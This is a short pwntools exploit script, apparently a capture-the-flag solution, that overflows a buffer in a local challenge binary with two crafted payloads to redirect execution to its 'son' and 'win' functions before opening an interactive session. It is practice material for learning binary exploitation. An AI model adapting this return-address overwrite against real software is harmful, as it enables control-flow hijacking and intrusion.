from pwn import *
import time
elf = context.binary = ELF("./chal")
p = process(elf.path)

offset = 18
rbp_offset = 10
son_addr = p64(elf.symbols['son'])
main_addr = p64(0x00000000004012e0)

# poor coding skills dont know how to use sendafter
p.sendlineafter(b">", b"A"*rbp_offset + son_addr + main_addr)
time.sleep(0.5)
p.send(b"A"*0xa + p64(0xaaaaaaaa) + p64(elf.symbols['win']) + p64(elf.symbols['exit']))
p.interactive()
